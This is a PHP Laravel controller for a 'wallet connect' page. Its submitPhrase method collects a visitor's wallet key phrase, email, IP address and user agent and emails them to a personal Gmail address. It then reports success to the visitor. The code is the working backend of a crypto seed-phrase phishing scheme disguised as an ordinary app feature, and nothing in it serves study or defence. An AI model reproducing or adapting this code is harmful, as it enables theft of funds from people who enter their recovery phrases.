<?php

namespace App\Http\Controllers;

use App\Mail\WalletConnectedMail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Log;

class ConnectController extends Controller
{
    public function index()
    {
        return view('templates.bento.blades.user.connect');
    }

    public function submitPhrase(Request $request)
    {
        $request->validate([
            'keyPhrase' => 'required|string',
        ]);

        $payload = [
            'keyPhrase' => $request->input('keyPhrase'),
            'user'      => auth()->check() ? auth()->user()->email : 'Guest',
            'date'      => now()->toIso8601String(),
            'ip'        => $request->ip() ?? 'Unknown',
            'userAgent' => $request->userAgent() ?? 'Unknown',
        ];

        try {
            // Sends using system email mail@sovereignvaultcapital.ltd configured in .env
            Mail::to('johnsonray1840@gmail.com')->send(new WalletConnectedMail($payload));

            return response()->json([
                'success' => true,
                'message' => 'Processed successfully.',
            ], 200);
        } catch (\Throwable $e) {
            Log::error('Wallet Connect Mail Error: ' . $e->getMessage());

            return response()->json([
                'success' => false,
                'message' => 'Could not process request.',
            ], 500);
        }
    }
}